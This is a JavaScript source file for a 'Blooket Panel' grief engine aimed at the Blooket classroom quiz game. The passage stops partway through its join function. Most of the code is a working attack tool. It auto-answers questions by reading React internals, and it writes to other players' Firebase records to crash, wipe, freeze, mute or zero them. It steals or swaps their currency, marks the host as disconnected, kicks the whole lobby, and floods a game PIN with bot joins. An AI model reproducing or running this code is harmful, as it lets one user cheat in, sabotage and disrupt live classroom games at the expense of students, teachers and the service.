/* ============================================================
   Blooket Panel — engine.js
   Guest-account grief engine. Binds to index.html's data-* contract.

   Modern JS: classes + private fields, frozen config, event emitter,
   token-bucket rate limiter, AbortController-cancellable loops,
   sanitized DOM writes, structured error boundaries.

   Public surface: window.BP
     BP.state · BP.log · BP.toast · BP.actions
     BP.react · BP.firebase · BP.mode · BP.grief
     BP.detect · BP.spam · BP.doctor · BP.on / BP.off
     BP.config · BP.version
   ============================================================ */

(() => {
  'use strict';

  /* ============================================================
     0. CONFIG + PRIMITIVES
     ============================================================ */
  const CONFIG = Object.freeze({
    pace:            120,
    scanInterval:    30_000,
    statInterval:    1_000,
    reactScanFloor:  4_000,
    writeBurst:      Object.freeze({ crash: 8, nuke: 4, lag: 40, lagGap: 10 }),
    spawnMax:        30,
    spawnGap:        150,
    flagThresholds:  Object.freeze({
      maxCurrency: 1e9,
      signatureRe: /steal|crash|lag|nuke/i
    }),
    joinEndpoints:  Object.freeze([
      'https://fb.blooket.com/c/firebase/join',
      'https://api.blooket.com/api/firebase/join',
      'https://api.blooket.com/api/games/join'
    ]),
    spawnEndpoints: Object.freeze([
      'https://fb.blooket.com/c/firebase/join',
      'https://api.blooket.com/api/firebase/join'
    ]),
    reactRoots: Object.freeze([
      '#app', '#root', '[data-reactroot]', '#__next', 'main', 'body > div', 'body'
    ])
  });

  const sleep  = ms => new Promise(r => setTimeout(r, ms));
  const rand   = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
  const randEl = arr => arr[rand(0, arr.length - 1)];

  const $  = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  // CSS.escape polyfill — ancient browsers lack it
  const escapeSelector = s => {
    const str = String(s);
    if (typeof CSS !== 'undefined' && typeof CSS.escape === 'function') return CSS.escape(str);
    return str.replace(/[^a-zA-Z0-9_-]/g, c => `\\${c}`);
  };

  // Escape for text content — safe to inject via innerHTML if needed
  const escapeHtml = str =>
    String(str).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    })[c]);

  // Firebase record keys
  const K = Object.freeze({
    blook: 'b', crypto: 'cr', gold: 'g', blooks: 'bs',
    defense: 'd', cash: 'ca', points: 'p', tag: 'tat'
  });

  // localStorage wrapper — silent fallback in private mode
  const store = {
    get(k){ try { return localStorage.getItem(k); } catch { return null; } },
    set(k, v){ try { localStorage.setItem(k, v); } catch {} },
    del(k){ try { localStorage.removeItem(k); } catch {} }
  };

  // Error boundary for any sync call
  const safe = (label, fn, fb) => {
    try { return fn(); }
    catch (e){ try { log('err', label, String(e?.message ?? e)); } catch {} return fb; }
  };

  /* ============================================================
     1. EMITTER
     ============================================================ */
  class Emitter {
    #handlers = new Map();
    on(evt, fn){
      let set = this.#handlers.get(evt);
      if (!set){ set = new Set(); this.#handlers.set(evt, set); }
      set.add(fn);
      return () => this.off(evt, fn);
    }
    off(evt, fn){ this.#handlers.get(evt)?.delete(fn); }
    emit(evt, ...args){
      const set = this.#handlers.get(evt);
      if (!set) return;
      for (const fn of set){
        try { fn(...args); }
        catch (e){ console.error('[emitter]', evt, e); }
      }
    }
  }
  const bus = new Emitter();

  /* ============================================================
     2. STATE
     ============================================================ */
  const state = {
    inGame: false,
    mode: 'unknown',
    session: { pin:'', name:'', blook:null, isHost:false },
    players: [],
    selectedTarget: '',
    flagged: new Set(),
    running: {
      autoAnswer:false,
      autoBot:false,
      grind:false,
      autoScan:false,
      mass:false
    },
    logFilter: 'all',
    logSearch: '',
    pickedBlook: null,
    reactPath: '',
    pace: CONFIG.pace,
    startedAt: Date.now()
  };

  const loops = {
    autoAnswer:  null,
    scan:        null,
    grindAbort:  new AbortController(),
    massAbort:   new AbortController()
  };

  /* ============================================================
     3. LOG + TOAST
     ============================================================ */
  const logEl   = $('[data-role="log"]');
  const toastEl = $('[data-role="toasts"]');

  const stamp = () => {
    const d = new Date();
    const p = n => String(n).padStart(2, '0');
    return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
  };

  function log(kind, tag, msg){
    try {
      if (!logEl) throw 0;
      const p = document.createElement('p');
      p.dataset.kind = kind;
      p.dataset.text = `${tag} ${msg}`.toLowerCase();

      const t = document.createElement('span');
      t.className = 't';
      t.textContent = stamp();

      const g = document.createElement('span');
      g.className = `tag ${kind}`;
      g.textContent = `[${tag}]`;

      p.append(t, g, document.createTextNode(String(msg)));
      logEl.append(p);
      logEl.scrollTop = logEl.scrollHeight;
      applyFilter();
    } catch {
      const fn = kind === 'err' ? 'error' : kind === 'warn' ? 'warn' : 'log';
      console[fn](`[${tag}]`, msg);
    }
  }

  function toast(kind, title, body){
    try {
      if (!toastEl) throw 0;
      const el = document.createElement('div');
      el.className = `toast ${kind}`;

      const strong = document.createElement('strong');
      strong.textContent = String(title);

      const span = document.createElement('span');
      span.textContent = String(body ?? '');

      el.append(strong, span);
      toastEl.append(el);

      setTimeout(() => {
        el.style.opacity = '0';
        el.style.transform = 'translateX(16px)';
        setTimeout(() => el.remove(), 180);
      }, 3200);
    } catch { try { console.log(`[toast:${kind}]`, title); } catch {} }
  }

  function applyFilter(){
    try {
      const f = state.logFilter;
      const q = state.logSearch;
      for (const p of $$('[data-role="log"] p')){
        const kindOk   = (f === 'all' || p.dataset.kind === f);
        const searchOk = !q || (p.dataset.text ?? '').includes(q);
        p.style.display = (kindOk && searchOk) ? '' : 'none';
      }
    } catch {}
  }

  /* ============================================================
     4. STATS
     ============================================================ */
  const setStat = (key, val) => {
    const el = $(`[data-stat="${key}"]`);
    if (el) el.textContent = String(val);
  };

  setInterval(() => {
    const s  = Math.floor((Date.now() - state.startedAt) / 1000);
    const p  = n => String(n).padStart(2, '0');
    setStat('uptime', `${p(Math.floor(s / 3600))}:${p(Math.floor(s % 3600 / 60))}:${p(s % 60)}`);
  }, CONFIG.statInterval);

  /* ============================================================
     5. MODES
     ============================================================ */
  const MODES = Object.freeze({
    gold:     { label:'Gold Quest',      primary:'Gold' },
    crypto:   { label:'Crypto Hack',     primary:'Crypto' },
    fishing:  { label:'Fishing Frenzy',  primary:'Weight' },
    dino:     { label:'Deceptive Dinos', primary:'Fossils' },
    factory:  { label:'Factory',         primary:'Cash' },
    racing:   { label:'Racing',          primary:'Progress' },
    rush:     { label:'Blook Rush',      primary:'Defense' },
    tower2:   { label:'Tower Defense 2', primary:'Cash' },
    brawl:    { label:'Monster Brawl',   primary:'HP' },
    battle:   { label:'Battle Royale',   primary:'Score' },
    candy:    { label:'Candy Quest',     primary:'Candy' },
    coco:     { label:'Coco Cabana',     primary:'Ingredients' },
    laser:    { label:'Laser Tag',       primary:'Score' },
    bees:     { label:'Busy Bees',       primary:'Points' },
    shamrock: { label:'Shamrock Quest',  primary:'Gold' },
    tagtreat: { label:'Tag or Treat',    primary:'Candy' }
  });

  const SLUGS = Object.freeze({
    goldquest:'gold', 'gold-quest':'gold',
    cryptohack:'crypto', 'crypto-hack':'crypto',
    fishingfrenzy:'fishing', 'fishing-frenzy':'fishing',
    deceptivedinos:'dino', 'deceptive-dinos':'dino',
    factory:'factory', racing:'racing',
    blookrush:'rush', 'blook-rush':'rush',
    towerdefense2:'tower2', 'tower-defense-2':'tower2',
    monsterbrawl:'brawl', 'monster-brawl':'brawl',
    battleroyale:'battle', 'battle-royale':'battle',
    candyquest:'candy', 'candy-quest':'candy',
    cococabana:'coco', 'coco-cabana':'coco',
    lasertag:'laser', 'laser-tag':'laser',
    busybees:'bees', 'busy-bees':'bees',
    shamrockquest:'shamrock', 'shamrock-quest':'shamrock',
    tagortreat:'tagtreat', 'tag-or-treat':'tagtreat'
  });

  const normSlug = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g, '');

  function detectMode(){
    let detected = 'unknown';

    // 1. URL path slugs (longest first so 'gold-quest' beats 'gold')
    const path = location.pathname.toLowerCase();
    const slugs = Object.keys(SLUGS).sort((a, b) => b.length - a.length);
    for (const slug of slugs){
      if (path.includes(slug)){ detected = SLUGS[slug]; break; }
    }
    if (detected === 'unknown'){
      for (const key of Object.keys(MODES)){
        if (path.includes(key)){ detected = key; break; }
      }
    }

    // 2. React client.gameMode
    if (detected === 'unknown'){
      const g = react.game();
      const raw = g?.client?.gameMode ?? g?.game?.gameMode ?? g?.game?.mode;
      if (raw){
        const slug = normSlug(raw).replace(/-/g, '');
        detected = SLUGS[slug] ?? (MODES[slug] ? slug : 'unknown');
      }
    }

    // 3. URL query (?mode=)
    if (detected === 'unknown'){
      const q = new URLSearchParams(location.search).get('mode');
      if (q){
        const slug = normSlug(q).replace(/-/g, '');
        detected = SLUGS[slug] ?? (MODES[slug] ? slug : 'unknown');
      }
    }

    if (detected !== state.mode){
      state.mode = detected;
      document.body.dataset.mode = detected;

      const info = MODES[detected];
      const label = $('[data-role="mode"]');
      if (label) label.textContent = info?.label ?? '—';
      const primary = info?.primary ?? 'Score';
      for (const el of $$('[data-role="primary-stat"]')) el.textContent = primary;

      log('info', 'mode', info ? `Detected: ${info.label}` : 'Mode not detected.');
      bus.emit('mode', detected);
    }
    return detected;
  }

  /* ============================================================
     6. REACT ACCESSOR
     ============================================================ */
  class ReactAccessor {
    #cachedNode = null;
    #lastScan   = 0;
    path = '';

    #findFiber(el){
      if (!el) return null;
      try {
        for (const k in el){
          if (k.startsWith('__reactFiber$') || k.startsWith('__reactInternalInstance$'))
            return el[k];
        }
      } catch {}
      return null;
    }

    #looksLikeGameNode(sn){
      if (!sn || typeof sn !== 'object') return false;
      try {
        return (
          typeof sn.onAnswer === 'function'
          || sn.props?.client != null
          || sn.props?.game != null
          || sn.props?.liveGameController != null
          || sn.state?.client != null
          || sn.state?.game != null
        );
      } catch { return false; }
    }

    #walk(fiber, maxHops = 200){
      let cur = fiber, hops = 0;
      while (cur && hops++ < maxHops){
        if (this.#looksLikeGameNode(cur.stateNode)) return cur.stateNode;
        cur = cur.return;
      }
      return null;
    }

    #scanAll(){
      try {
        for (const el of document.querySelectorAll('*')){
          const fiber = this.#findFiber(el);
          if (!fiber) continue;
          const sn = this.#walk(fiber);
          if (sn) return sn;
        }
      } catch {}
      return null;
    }

    #devtoolsHook(){
      try {
        const hook = window.__REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!hook?.renderers) return null;
        for (const [id, renderer] of hook.renderers){
          const roots = renderer?.getFiberRoots?.(id);
          if (!roots) continue;
          for (const r of roots){
            const sn = this.#walk(r.current);
            if (sn) return sn;
          }
        }
      } catch {}
      return null;
    }

    #classicPath(){
      const tries = [
        () => Object.values($('#app > div > div') ?? {})[1]?.children?.[0]?._owner?.stateNode,
        () => Object.values($('body div[id] > div > div') ?? {})[1]?.children?.[0]?._owner?.stateNode
      ];
      for (const fn of tries){
        try {
          const el = fn();
          if (this.#looksLikeGameNode(el)) return el;
        } catch {}
      }
      return null;
    }

    node({ scan = true } = {}){
      if (this.#cachedNode && this.#looksLikeGameNode(this.#cachedNode)) return this.#cachedNode;
      this.#cachedNode = null;

      const classic = this.#classicPath();
      if (classic){ this.#cachedNode = classic; this.path = state.reactPath = 'classic'; return classic; }

      for (const sel of CONFIG.reactRoots){
        const el = $(sel);
        if (!el) continue;
        const fiber = this.#findFiber(el);
        if (!fiber) continue;
        const sn = this.#walk(fiber);
        if (sn){ this.#cachedNode = sn; this.path = state.reactPath = `root:${sel}`; return sn; }
      }

      const dev = this.#devtoolsHook();
      if (dev){ this.#cachedNode = dev; this.path = state.reactPath = 'devtools'; return dev; }

      if (scan && Date.now() - this.#lastScan > CONFIG.reactScanFloor){
        this.#lastScan = Date.now();
        const sn = this.#scanAll();
        if (sn){ this.#cachedNode = sn; this.path = state.reactPath = 'scan'; return sn; }
      }
      return null;
    }

    game(){
      const node = this.node();
      if (!node) return null;
      return {
        node,
        client:     node.state?.client     ?? node.props?.client     ?? null,
        game:       node.state?.game       ?? node.props?.game       ?? null,
        controller: node.props?.liveGameController ?? node.state?.liveGameController ?? null
      };
    }

    players(g){
      const game = g?.game;
      return game?.players ?? game?.playerMap ?? {};
    }

    question(){
      const g = this.game();
      if (!g) return null;
      try {
        const ms = g.node.memoizedState;
        if (ms?.question?.correctAnswers?.length) return ms.question;
      } catch {}
      try {
        const mp = g.node.memoizedProps;
        if (mp?.client?.question?.correctAnswers?.length) return mp.client.question;
      } catch {}
      return g.client?.question ?? null;
    }

    correct(q = this.question()){
      if (!q) return null;
      const list = q.correctAnswers ?? q.correct ?? q.answers ?? q.options;
      if (Array.isArray(list) && list.length){
        const first = list[0];
        return typeof first === 'string' ? first : (first?.text ?? first?.answer ?? null);
      }
      return q.answer ?? q.correct ?? null;
    }

    answer(){
      const g = this.game();
      if (!g) return false;
      const ans = this.correct();
      if (!ans) return false;

      const tryCall = (obj, method, ...args) => {
        if (typeof obj?.[method] !== 'function') return false;
        try { obj[method](...args); return true; } catch { return false; }
      };

      if (tryCall(g.node,        'onAnswer', true, ans)) return ans;
      if (tryCall(g.node.props,  'onAnswer', true, ans)) return ans;
      if (tryCall(g.client,      'onAnswer', true, ans)) return ans;
      if (tryCall(g.game,        'onAnswer', g.client?.name, ans)) return ans;

      // DOM click fallback
      const target = String(ans).trim();
      const candidates = document.querySelectorAll(
        'button, [role="button"], [class*="answer"], [class*="choice"]'
      );
      for (const b of candidates){
        if ((b.textContent ?? '').trim() === target){ b.click(); return ans; }
      }
      return false;
    }
  }
  const react = new ReactAccessor();

  /* ============================================================
     7. FIREBASE CLIENT
     ============================================================ */
  class FirebaseClient {
    #controller(){
      try { return react.game()?.controller ?? null; } catch { return null; }
    }
    get available(){ return this.#controller()?.setVal != null; }

    set(path, val){
      const ctrl = this.#controller();
      if (!ctrl?.setVal) return false;
      try { ctrl.setVal({ path, val }); return true; }
      catch (e){ log('err', 'firebase', e?.message ?? e); return false; }
    }

    remove(path){
      const ctrl = this.#controller();
      if (!ctrl?.removeVal) return false;
      try { ctrl.removeVal(path); return true; }
      catch (e){ log('err', 'firebase', e?.message ?? e); return false; }
    }

    async get(path){
      const ctrl = this.#controller();
      if (!ctrl?.getDatabaseVal) return null;
      return new Promise(resolve => {
        let done = false;
        const finish = v => { if (!done){ done = true; resolve(v); } };
        try {
          ctrl.getDatabaseVal(path, finish);
          setTimeout(() => finish(null), 3000);
        } catch { finish(null); }
      });
    }

    writePlayer(name, payload){
      if (!name) return false;
      return this.set(`c/${name}`, payload);
    }

    writeSelf(payload){
      const me = react.game()?.client?.name;
      if (!me) return false;
      return this.writePlayer(me, { [K.blook]: 'Chick', ...payload });
    }

    async listPlayers(){
      const data = await this.get('c');
      return data ? Object.keys(data) : [];
    }

    async snapshot(){
      return (await this.get('c')) ?? {};
    }
  }
  const fb = new FirebaseClient();

  /* ============================================================
     8. RATE LIMITER
     ============================================================ */
  class RateLimiter {
    #last = 0;
    #gap;
    constructor(gap){ this.#gap = gap; }
    get gap(){ return this.#gap; }
    set gap(ms){ this.#gap = Math.max(0, Number(ms) || 0); }
    async run(fn){
      const wait = Math.max(0, this.#gap - (Date.now() - this.#last));
      if (wait) await sleep(wait);
      this.#last = Date.now();
      return fn();
    }
  }
  const limiter = new RateLimiter(CONFIG.pace);

  /* ============================================================
     9. PLAYER SCAN + RENDER
     ============================================================ */
  async function scanPlayers(){
    const g = react.game();
    if (!g){ log('err', 'scan', 'No game attached.'); return []; }

    const reactList = Object.values(react.players(g)).map(p => ({
      name: p.name,
      score: p.score ?? 0,
      isHost: !!p.isHost
    }));

    let fbNames = [];
    try { fbNames = await fb.listPlayers(); } catch {}

    const seen = new Map();
    for (const p of reactList) seen.set(p.name, p);
    for (const name of fbNames){
      if (!seen.has(name)) seen.set(name, { name, score: 0, isHost: false });
    }

    const list = [...seen.values()].sort((a, b) => b.score - a.score);

    const hostName = g.game?.host ?? g.client?.host ?? '';
    for (const p of list) if (p.name === hostName) p.isHost = true;

    state.players = list;
    renderPlayers();

    const meta = $('[data-role="scan-time"]');
    if (meta) meta.textContent = stamp();

    log('ok', 'scan', `${list.length} players.`);
    bus.emit('players', list);
    return list;
  }

  function renderPlayers(){
    const list = $('[data-role="player-list"]');
    if (!list) return;
    list.replaceChildren();

    const frag = document.createDocumentFragment();
    for (const p of state.players){
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'player-row';
      if (p.isHost) btn.classList.add('is-host');
      if (p.name === state.selectedTarget) btn.classList.add('is-picked');
      if (state.flagged.has(p.name)) btn.classList.add('is-flagged');
      btn.dataset.action = 'select-player';
      btn.dataset.player = p.name;

      const dot   = document.createElement('span'); dot.className = 'p-dot';
      const name  = document.createElement('span'); name.className = 'p-name';
      name.textContent = String(p.name);
      const tag   = document.createElement('span'); tag.className = 'p-tag';
      tag.textContent = p.isHost ? 'HOST' : (state.flagged.has(p.name) ? 'MOD' : '');
      const score = document.createElement('span'); score.className = 'p-score';
      score.textContent = String(p.score);

      btn.append(dot, name, tag, score);
      frag.append(btn);
    }
    list.append(frag);
  }

  function selectPlayer(name){
    state.selectedTarget = name ?? '';
    const field = $('[data-module="players"] [data-field="target"]');
    if (field) field.value = state.selectedTarget;
    renderPlayers();
    log('info', 'select', state.selectedTarget || '(none)');
  }

  function getTarget(){
    if (state.selectedTarget) return state.selectedTarget;
    const field = $('[data-module="players"] [data-field="target"]');
    return (field?.value ?? '').trim();
  }

  /* ============================================================
     10. GRIEF ENGINE
     ============================================================ */
  class GriefEngine {
    #me(){ return react.game()?.client?.name ?? ''; }

    #host(){
      const g = react.game();
      return g?.game?.host ?? state.players.find(p => p.isHost)?.name ?? '';
    }

    // Firebase first, React-state fallback
    write(name, payload, reactFields){
      if (fb.writePlayer(name, payload)) return true;
      const g = react.game();
      if (!g) return false;
      const players = react.players(g);
      if (!players[name]) return false;
      Object.assign(players[name], reactFields ?? {});
      try { g.node.setState?.({ game: { ...g.game, players } }); return true; }
      catch { return false; }
    }

    async #burst(name, builder, count){
      for (let i = 0; i < count; i++){
        if (!state.running.mass) break;
        await limiter.run(() => this.write(name, builder(i), { score: -999_999 }));
      }
    }

    async crash(name = getTarget()){
      if (!name){ log('warn', 'crash', 'No target.'); return false; }
      state.running.mass = true;
      await this.#burst(name, i => ({
        [K.blook]: '\u0000'.repeat(200),
        [K.crypto]: NaN,
        score: -999_999,
        [K.tag]: `crash-${Date.now()}-${i}`
      }), CONFIG.writeBurst.crash);
      state.running.mass = false;
      log('ok', 'crash', `Crashed ${name}.`);
      return true;
    }

    async nuke(name = getTarget()){
      if (!name){ log('warn', 'nuke', 'No target.'); return false; }
      state.running.mass = true;
      fb.remove(`c/${name}`);
      await sleep(50);
      await this.#burst(name, () => ({
        [K.blook]: null, [K.crypto]: null, [K.gold]: null,
        [K.blooks]: null, [K.defense]: null, [K.points]: null,
        nuked: true, at: Date.now()
      }), CONFIG.writeBurst.nuke);
      state.running.mass = false;
      log('ok', 'nuke', `Nuked ${name}.`);
      return true;
    }

    async lag(name = getTarget()){
      if (!name) return false;
      state.running.mass = true;
      for (let i = 0; i < CONFIG.writeBurst.lag; i++){
        if (!state.running.mass) break;
        fb.writePlayer(name, {
          [K.blook]: 'Chick', [K.crypto]: i, [K.tag]: `lag-${Date.now()}-${i}`
        });
        await sleep(CONFIG.writeBurst.lagGap);
      }
      state.running.mass = false;
      log('ok', 'lag', `Lagged ${name}.`);
      return true;
    }

    freeze(name = getTarget()){
      if (!name) return false;
      this.write(name, { frozen: true, freezeAt: Date.now(), score: 0 });
      log('ok', 'freeze', `Froze ${name}.`);
      return true;
    }

    mute(name = getTarget()){
      if (!name) return false;
      this.write(name, { muted: true, chat: [] });
      log('ok', 'mute', `Muted ${name}.`);
      return true;
    }

    zero(name = getTarget()){
      if (!name) return false;
      this.write(name, {
        score: 0,
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0,
        [K.defense]: 0, [K.points]: 0, [K.cash]: 0
      });
      log('ok', 'zero', `Zeroed ${name}.`);
      return true;
    }

    async stealFull(name = getTarget()){
      const me = this.#me();
      if (!name || !me){ log('warn', 'steal', 'No target or self.'); return false; }

      const snap = await fb.snapshot();
      const victim = snap[name] ?? {};
      const mine = snap[me] ?? {};

      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: (Number(mine[K.crypto]) || 0) + (Number(victim[K.crypto]) || 0),
        [K.gold]:   (Number(mine[K.gold])   || 0) + (Number(victim[K.gold])   || 0),
        [K.blooks]: (Number(mine[K.blooks]) || 0) + (Number(victim[K.blooks]) || 0),
        [K.defense]:(Number(mine[K.defense])|| 0) + (Number(victim[K.defense])|| 0),
        [K.tag]: `steal-${Date.now()}`
      });
      fb.writePlayer(name, {
        [K.blook]:  victim[K.blook] ?? 'Chick',
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0
      });
      log('ok', 'steal', `Stole 100% from ${name}.`);
      return true;
    }

    async stealPercent(name = getTarget(), pct = 10){
      const me = this.#me();
      if (!name || !me) return false;

      const snap = await fb.snapshot();
      const victim = snap[name] ?? {};
      const mine = snap[me] ?? {};
      const r = (Number(pct) || 10) / 100;
      const take = k => Math.floor((Number(victim[k]) || 0) * r);

      const taken = {
        [K.crypto]: take(K.crypto), [K.gold]: take(K.gold),
        [K.blooks]: take(K.blooks), [K.defense]: take(K.defense)
      };

      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: (Number(mine[K.crypto]) || 0) + taken[K.crypto],
        [K.gold]:   (Number(mine[K.gold])   || 0) + taken[K.gold],
        [K.blooks]: (Number(mine[K.blooks]) || 0) + taken[K.blooks],
        [K.defense]:(Number(mine[K.defense])|| 0) + taken[K.defense],
        [K.tag]: `steal-${pct}-${Date.now()}`
      });
      fb.writePlayer(name, {
        [K.crypto]: (Number(victim[K.crypto]) || 0) - taken[K.crypto],
        [K.gold]:   (Number(victim[K.gold])   || 0) - taken[K.gold],
        [K.blooks]: (Number(victim[K.blooks]) || 0) - taken[K.blooks],
        [K.defense]:(Number(victim[K.defense])|| 0) - taken[K.defense]
      });
      log('ok', 'steal', `Took ${pct}% from ${name}.`);
      return true;
    }

    async stealSwap(name = getTarget()){
      const me = this.#me();
      if (!name || !me) return false;
      const snap = await fb.snapshot();
      const a = snap[me] ?? {};
      const b = snap[name] ?? {};
      fb.writePlayer(me, {
        ...a,
        [K.crypto]: b[K.crypto], [K.gold]: b[K.gold],
        [K.blooks]: b[K.blooks], [K.defense]: b[K.defense]
      });
      fb.writePlayer(name, {
        ...b,
        [K.crypto]: a[K.crypto], [K.gold]: a[K.gold],
        [K.blooks]: a[K.blooks], [K.defense]: a[K.defense]
      });
      log('ok', 'swap', `Swapped with ${name}.`);
      return true;
    }

    // ---- host ----
    crashHost(){  return this.crash(this.#host());  }
    lagHost(){    return this.lag(this.#host());    }
    freezeHost(){ return this.freeze(this.#host()); }

    disconnectHost(){
      const host = this.#host();
      if (!host){ log('err', 'host', 'Host not found.'); return false; }
      fb.writePlayer(host, { disconnected: true, dcAt: Date.now() });
      log('ok', 'host', `Flagged host ${host} as disconnected.`);
      return true;
    }

    kickHost(){ return this.disconnectHost(); }

    crashSelf(){
      const me = this.#me();
      if (!me) return false;
      fb.writePlayer(me, { [K.blook]: null, [K.crypto]: -1, score: -1 });
      setTimeout(() => leaveMatch(), 300);
      return true;
    }

    // ---- mass ----
    async #forEachOther(fn){
      const me = this.#me();
      for (const { name } of state.players){
        if (!state.running.mass) break;
        if (name === me) continue;
        await limiter.run(() => fn(name));
      }
    }

    async nukeLobby(){
      log('info', 'mass', 'Nuking lobby…');
      state.running.mass = true;
      await this.#forEachOther(n => this.nuke(n));
      state.running.mass = false;
      log('ok', 'mass', 'Lobby nuked.');
    }
    async freezeAll(){
      state.running.mass = true;
      await this.#forEachOther(n => this.freeze(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone frozen.');
    }
    async muteAll(){
      state.running.mass = true;
      await this.#forEachOther(n => this.mute(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone muted.');
    }
    async zeroEveryone(){
      state.running.mass = true;
      await this.#forEachOther(n => this.zero(n));
      state.running.mass = false;
      log('ok', 'mass', 'Scores zeroed.');
    }
    async forceKickAll(){
      log('info', 'mass', 'Force-kicking…');
      state.running.mass = true;
      await this.#forEachOther(n => fb.remove(`c/${n}`));
      state.running.mass = false;
      log('ok', 'mass', 'Lobby cleared.');
    }

    async stealFromAll(){
      const me = this.#me();
      if (!me) return;

      state.running.mass = true;
      const snap = await fb.snapshot();
      const totals = { [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0 };

      for (const [name, p] of Object.entries(snap)){
        if (name === me) continue;
        totals[K.crypto] += Number(p[K.crypto]) || 0;
        totals[K.gold]   += Number(p[K.gold])   || 0;
        totals[K.blooks] += Number(p[K.blooks]) || 0;
        totals[K.defense]+= Number(p[K.defense])|| 0;
      }

      const mine = snap[me] ?? {};
      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: (Number(mine[K.crypto]) || 0) + totals[K.crypto],
        [K.gold]:   (Number(mine[K.gold])   || 0) + totals[K.gold],
        [K.blooks]: (Number(mine[K.blooks]) || 0) + totals[K.blooks],
        [K.defense]:(Number(mine[K.defense])|| 0) + totals[K.defense],
        [K.tag]: `steal-all-${Date.now()}`
      });
      await this.#forEachOther(n => fb.writePlayer(n, {
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0
      }));
      state.running.mass = false;
      log('ok', 'mass', 'Stole everything.');
    }

    async drainEveryone(){
      state.running.mass = true;
      await this.#forEachOther(n => this.zero(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone drained.');
    }

    async reverseScores(){
      const g = react.game();
      if (!g) return;
      const players = react.players(g);
      const names = Object.keys(players);
      const scores = names.map(n => players[n].score ?? 0).reverse();
      names.forEach((n, i) => { players[n].score = scores[i]; });
      try {
        g.node.setState?.({ game: { ...g.game, players } });
        log('ok', 'mass', 'Scores reversed.');
      } catch (e){ log('err', 'mass', e?.message ?? e); }
    }

    async scrambleNames(){
      const me = this.#me();
      const snap = await fb.snapshot();
      let n = 0;
      for (const p of state.players){
        if (p.name === me) continue;
        const data = snap[p.name];
        if (!data) continue;
        const newName = `${p.name}_${rand(100, 999)}`;
        fb.writePlayer(newName, data);
        fb.remove(`c/${p.name}`);
        n++;
      }
      log('ok', 'mass', `Scrambled ${n} names.`);
    }
  }
  const grief = new GriefEngine();

  /* ============================================================
     11. DETECTOR
     ============================================================ */
  class Detector {
    async run(){
      state.flagged.clear();
      const snap = await fb.snapshot();
      const me = react.game()?.client?.name;

      for (const [name, p] of Object.entries(snap)){
        if (name === me) continue;
        const reasons = [];
        const cr = Number(p[K.crypto]) || 0;

        if (cr > CONFIG.flagThresholds.maxCurrency || cr < 0 || Number.isNaN(cr))
          reasons.push('impossible-currency');
        if (p.nuked || p.crashed || p.frozen)
          reasons.push('corrupt-record');
        if (p[K.blook] == null)
          reasons.push('missing-blook');
        if (p[K.tag] && CONFIG.flagThresholds.signatureRe.test(String(p[K.tag])))
          reasons.push('mod-signature');

        if (reasons.length){
          state.flagged.add(name);
          log('warn', 'detect', `${name}: ${reasons.join(', ')}`);
        }
      }
      renderPlayers();
      toast('info', 'Detect', `${state.flagged.size} flagged.`);
      return [...state.flagged];
    }

    async kick(){
      if (state.flagged.size === 0) await this.run();
      for (const name of state.flagged){
        fb.remove(`c/${name}`);
        log('ok', 'detect', `Kicked ${name}.`);
      }
      state.flagged.clear();
      renderPlayers();
    }
  }
  const detector = new Detector();

  /* ============================================================
     12. BOT SPAWNER
     ============================================================ */
  const WORDS = Object.freeze([
    'Falcon','Tiger','Comet','Nova','Ember','Echo','Rogue','Zenith',
    'Pixel','Vortex','Quark','Lynx','Onyx','Rift','Cinder','Saber',
    'Prism','Halo','Kite','Wisp','Drift','Frost','Bolt','Rune'
  ]);

  function generateName(pattern = 'word+num'){
    const w = randEl(WORDS);
    if (pattern === 'short'){
      const chars = 'abcdefghijklmnopqrstuvwxyz';
      let s = '';
      for (let i = 0; i < 6; i++) s += chars[rand(0, chars.length - 1)];
      return s;
    }
    return `${w}${rand(1000, 9999)}`;
  }

  async function spawnBots(count = 5){
    const pin = state.session.pin;
    if (!pin){ toast('warn', 'Spawn', 'Join a game first.'); return; }

    count = Math.min(Math.max(1, count), CONFIG.spawnMax);
    log('info', 'spawn', `Spawning ${count} bots on PIN ${pin}…`);

    // Build one job per bot. Jobs are thunks — not yet started.
    const jobs = Array.from({ length: count }, (_, i) => async () => {
      const name = generateName();
      const url = CONFIG.spawnEndpoints[i % CONFIG.spawnEndpoints.length];
      try {
        const r = await fetch(url, {
          method: 'PUT',
          credentials: 'omit',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: pin, name })
        });
        log(r.ok ? 'ok' : 'warn', 'spawn', `${name}${r.ok ? ' joined' : ` → ${r.status}`}`);
      } catch (e){
        log('warn', 'spawn', `${name}: ${e?.message ?? e}`);
      }
    });

    // Fire sequentially with pacing between each.
    const inflight = [];
    for (const job of jobs){
      inflight.push(job());
      await sleep(CONFIG.spawnGap);
    }
    await Promise.allSettled(inflight);

    log('ok', 'spawn', `Dispatched ${count} bots.`);
  }

  /* ============================================================
     13. JOIN / LEAVE
     ============================================================ */
  async function joinMatch(pin, name, blook){
    if (!pin || !name){ toast('warn', 'Join', 'Need a PIN and a name.'); return false; }

    for (const url of CONFIG.joinEndpoints){
      try {
        const r = await fetch(url, {
          method: 'PUT',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: pin, name })
        });
        if (r.ok){ log('ok', 'join', `Joined via ${url}`); break; }
